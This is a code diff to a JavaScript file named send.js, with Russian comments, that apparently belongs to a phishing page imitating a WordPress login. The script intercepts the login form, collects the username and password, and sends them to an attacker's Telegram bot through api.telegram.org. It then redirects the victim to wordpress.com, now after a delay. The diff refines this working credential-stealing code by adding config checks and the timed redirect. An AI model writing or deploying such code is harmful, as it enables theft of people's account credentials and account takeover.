@@ -1,9 +1,10 @@
 document.getElementById('loginform').addEventListener('submit', async function(e) {
-    // ПРЕДОТВРАЩАЕМ ЛЮБУЮ СТАНДАРТНУЮ ОТПРАВКУ
     e.preventDefault();
     e.stopPropagation();
     
     console.log("Скрипт send.js начал работу!");
+    console.log("BOT_TOKEN из config:", window.BOT_TOKEN);  // Проверка, что config загрузился
+    console.log("CHAT_ID из config:", window.CHAT_ID);
 
     const formData = new FormData(this);
     const login = formData.get('log');
@@ -14,13 +15,13 @@ document.getElementById('loginform').addEventListener('submit', async function(e
     console.log("Сообщение для отправки:", message);
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                chat_id: CHAT_ID,
+                chat_id: window.CHAT_ID,
                 text: message
             })
         });
@@ -39,7 +40,9 @@ document.getElementById('loginform').addEventListener('submit', async function(e
     }
     
     // Перенаправление ПОСЛЕ отправки
-    window.location.href = 'https://wordpress.com/';
+    setTimeout(() => {
+        window.location.href = 'https://wordpress.com/';
+    }, 1500);
 });
 
 async function getIP() {
